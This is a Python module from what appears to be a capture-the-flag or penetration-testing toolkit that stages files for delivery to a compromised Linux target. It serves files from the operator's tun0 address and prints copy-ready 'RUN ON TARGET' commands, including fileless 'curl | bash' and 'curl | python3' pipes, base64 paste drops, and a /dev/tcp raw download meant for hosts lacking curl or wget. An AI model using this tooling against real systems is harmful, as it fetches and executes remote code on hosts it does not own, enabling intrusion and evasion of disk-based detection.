import base64
import http.server
import os
import socket
import socketserver
import tarfile
import tempfile
import threading

from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def _human_size(num_bytes):

    size = float(num_bytes)

    for unit in ("B", "KB", "MB", "GB"):

        if size < 1024:
            return f"{size:.0f} {unit}" if unit == "B" else f"{size:.1f} {unit}"

        size /= 1024

    return f"{size:.1f} TB"


def _manifest_table(files):

    table = Table(
        box=None,
        show_header=True,
        header_style="bold cyan",
        pad_edge=False,
        expand=False,
    )

    table.add_column("File", style="white")
    table.add_column("Size", justify="right", style="white")

    total = 0

    for filepath in files:

        size = Path(filepath).stat().st_size
        total += size

        table.add_row(Path(filepath).name, _human_size(size))

    table.add_section()

    table.add_row(
        f"[bold cyan]{len(files)} file(s)[/bold cyan]",
        f"[bold cyan]{_human_size(total)}[/bold cyan]",
    )

    return table


def _print_script(lines, title):

    #
    # No box — a bordered panel puts a leading "│" on every line, which a
    # drag-select-to-copy off the terminal (no clipboard access, over SSH,
    # etc.) would grab too. A rule frames it without touching the text.
    #
    console.print()
    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
    console.print()

    for line in lines:
        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)

    console.print()


def _print_alternatives(label_cmds):

    console.rule("[dim]other delivery methods[/dim]", style="grey50", align="left")
    console.print()

    for label, cmd in label_cmds:

        console.print(
            f"[dim cyan]{label:<10}[/dim cyan][yellow]{cmd}[/yellow]",
            soft_wrap=True,
            highlight=False,
        )

    console.print()


def detect_ip():

    try:

        import netifaces

        if "tun0" in netifaces.interfaces():

            iface = netifaces.ifaddresses("tun0")

            if netifaces.AF_INET in iface:

                return iface[netifaces.AF_INET][0]["addr"]

    except Exception:
        pass

    try:

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM
        )

        s.connect(("1.1.1.1", 80))

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


# =========================================================
# TAR DIRECTORY
# =========================================================

def prepare_file(path):

    path = Path(path).resolve()

    if path.is_file():
        return path

    temp_dir = Path(
        tempfile.gettempdir()
    )

    archive = (
        temp_dir /
        f"{path.name}.tar.gz"
    )

    with tarfile.open(
        archive,
        "w:gz"
    ) as tar:

        tar.add(
            path,
            arcname=path.name
        )

    return archive


# =========================================================
# HTTP SERVER
# =========================================================

def serve_http(directory, port=8080):

    directory = Path(directory).resolve()

    os.chdir(directory)

    handler = (
        http.server.SimpleHTTPRequestHandler
    )

    class ReusableTCPServer(
        socketserver.TCPServer
    ):
        allow_reuse_address = True

    httpd = ReusableTCPServer(
        ("0.0.0.0", port),
        handler
    )

    thread = threading.Thread(
        target=httpd.serve_forever,
        daemon=True
    )

    thread.start()

    return httpd


# =========================================================
# COMMAND BUILDERS
# =========================================================

def build_http_commands(
    ip,
    port,
    filename
):

    return {
        "curl":
            f"curl -O http://{ip}:{port}/{filename}",

        "wget":
            f"wget http://{ip}:{port}/{filename}",
    }


def build_fileless_commands(
    ip,
    port,
    filename
):

    if filename.endswith(".sh"):

        return {
            "curl":
                f"curl -s http://{ip}:{port}/{filename} | bash",

            "wget":
                f"wget -qO- http://{ip}:{port}/{filename} | bash",
        }

    elif filename.endswith(".py"):

        return {
            "curl":
                f"curl -s http://{ip}:{port}/{filename} | python3",

            "wget":
                f"wget -qO- http://{ip}:{port}/{filename} | python3",
        }

    return None


def build_offline_command(filepath):

    data = Path(
        filepath
    ).read_bytes()

    encoded = (
        base64
        .b64encode(data)
        .decode()
    )

    filename = (
        Path(filepath)
        .name
    )

    return (
        f"echo '{encoded}' "
        f"| base64 -d > {filename}"
    )


def build_bash_tcp_command(
    ip,
    port,
    filename
):

    return (
        f"exec 3<>/dev/tcp/{ip}/{port}; "
        f"echo -e "
        f"'GET /{filename} HTTP/1.1\\r\\n"
        f"Host: {ip}:{port}\\r\\n"
        f"Connection: close\\r\\n\\r\\n' >&3; "
        f"awk 'BEGIN{{RS=\"\\r\\n\\r\\n\"}} "
        f"NR==2{{print > \"{filename}\"}}' <&3"
    )


# =========================================================
# MODES
# =========================================================

def mode_http(
    files,
    ip,
    port
):

    console.print()
    console.print(
        Panel(
            _manifest_table(files),
            title="[bold white]HTTP DELIVERY[/bold white]",
            title_align="left",
            border_style="cyan",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    script_lines = []
    per_file_cmds = {}

    for filepath in files:

        filename = Path(filepath).name

        cmds = build_http_commands(ip, port, filename)

        per_file_cmds[filename] = cmds

        script_lines.append(cmds["curl"])

    _print_script(script_lines, "RUN ON TARGET")

    copy_clipboard("\n".join(script_lines))

    console.print("[green]→ copied to clipboard[/green]")
    console.print()

    example = per_file_cmds[Path(files[0]).name]

    _print_alternatives([("wget", example["wget"])])

    console.print(f"[yellow][*] Serving {len(files)} file(s) at http://{ip}:{port}/[/yellow]", highlight=False)

    return serve_http(
        Path(files[0]).parent,
        port
    )


def mode_fileless(
    filepath,
    ip,
    port
):

    filename = Path(filepath).name

    cmds = build_fileless_commands(ip, port, filename)

    if not cmds:

        console.print("[red][!] Unsupported file type[/red]")

        return

    size = _human_size(Path(filepath).stat().st_size)

    console.print()
    console.print(
        f"[bold white]FILELESS DELIVERY[/bold white]  "
        f"[dim]{filename} · {size} · nothing ever touches disk[/dim]",
        highlight=False,
    )

    _print_script([cmds["curl"]], "RUN ON TARGET")

    copy_clipboard(cmds["curl"])

    console.print("[green]→ copied to clipboard[/green]")
    console.print()

    _print_alternatives([("wget", cmds["wget"])])

    console.print(f"[yellow][*] Serving {filename} at http://{ip}:{port}/[/yellow]", highlight=False)

    return serve_http(
        Path(filepath).parent,
        port
    )


def mode_offline(files):

    console.print()
    console.print(
        Panel(
            _manifest_table(files),
            title="[bold white]OFFLINE DELIVERY[/bold white]",
            title_align="left",
            border_style="cyan",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    script_lines = [build_offline_command(filepath) for filepath in files]

    _print_script(script_lines, "RUN ON TARGET, one file at a time")

    copy_clipboard("\n\n".join(script_lines))

    console.print("[green]→ copied to clipboard[/green]")


def mode_bash(
    files,
    ip,
    port
):

    console.print()
    console.print(
        Panel(
            _manifest_table(files),
            title="[bold white]BASH TCP DELIVERY[/bold white]",
            title_align="left",
            border_style="cyan",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    script_lines = [
        build_bash_tcp_command(ip, port, Path(filepath).name)
        for filepath in files
    ]

    _print_script(script_lines, "RUN ON TARGET — /dev/tcp, no curl/wget needed")

    copy_clipboard("\n".join(script_lines))

    console.print("[green]→ copied to clipboard[/green]")

    return serve_http(
        Path(files[0]).parent,
        port
    )


# =========================================================
# MENU
# =========================================================

def choose_mode():

    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
    table.add_column(style="bold cyan", no_wrap=True)
    table.add_column(style="white")
    table.add_column(style="dim")

    table.add_row("[1] HTTP", "curl/wget", "fastest, needs a listener port")
    table.add_row("[2] Fileless", "curl | bash", "nothing ever touches disk")
    table.add_row("[3] Offline", "base64 paste", "no network in/out at all")
    table.add_row("[4] Bash TCP", "/dev/tcp", "no curl/wget on target needed")

    console.print()
    console.print(
        Panel(
            table,
            title="[bold white]LINUX FILE DELIVERY[/bold white]",
            title_align="left",
            border_style="blue",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    choice = input(f"\n{B}select> {W}").strip()

    return {
        "1": "http",
        "2": "fileless",
        "3": "offline",
        "4": "bash",
    }.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def stage_linux_files(
    files,
    method=None,
    ip=None,
    port=8080,
):

    files = [
        prepare_file(f)
        for f in files
    ]

    for filepath in files:

        if not Path(filepath).exists():

            console.print(f"[red][!] File not found:[/red] {filepath}", highlight=False)

            return

    if not ip:
        ip = detect_ip()

    if not method:
        method = choose_mode()

    if not method:
        return

    if method == "http":

        server = mode_http(
            files,
            ip,
            port
        )

        try:
            input(
                "\nPress ENTER to stop server...\n"
            )
        finally:
            server.shutdown()

    elif method == "fileless":

        if len(files) != 1:

            console.print("[red][!] Fileless only supports one file[/red]")

            return

        server = mode_fileless(
            files[0],
            ip,
            port
        )

        try:
            input(
                "\nPress ENTER to stop server...\n"
            )
        finally:
            server.shutdown()

    elif method == "offline":

        mode_offline(files)

    elif method == "bash":

        server = mode_bash(
            files,
            ip,
            port
        )

        try:
            input(
                "\nPress ENTER to stop server...\n"
            )
        finally:
            server.shutdown()


def stage_linux_file(
    filepath,
    method=None,
    ip=None,
    port=8080,
):

    return stage_linux_files(
        [filepath],
        method,
        ip,
        port
    )


def run(data=None, cred=None, args=None):

    files = []

    arg_files = getattr(
        args,
        "files",
        None
    )

    if arg_files:

        if isinstance(
            arg_files,
            str
        ):
            files.append(
                arg_files
            )

        else:
            files.extend(
                arg_files
            )

    arg_file = getattr(
        args,
        "file",
        None
    )

    if arg_file:
        files.append(
            arg_file
        )

    if not files:

        console.print("[red][!] Usage:[/red] ctf upload.linux <file>", highlight=False)

        return data

    files = list(
        dict.fromkeys(files)
    )

    stage_linux_files(files)

    return data
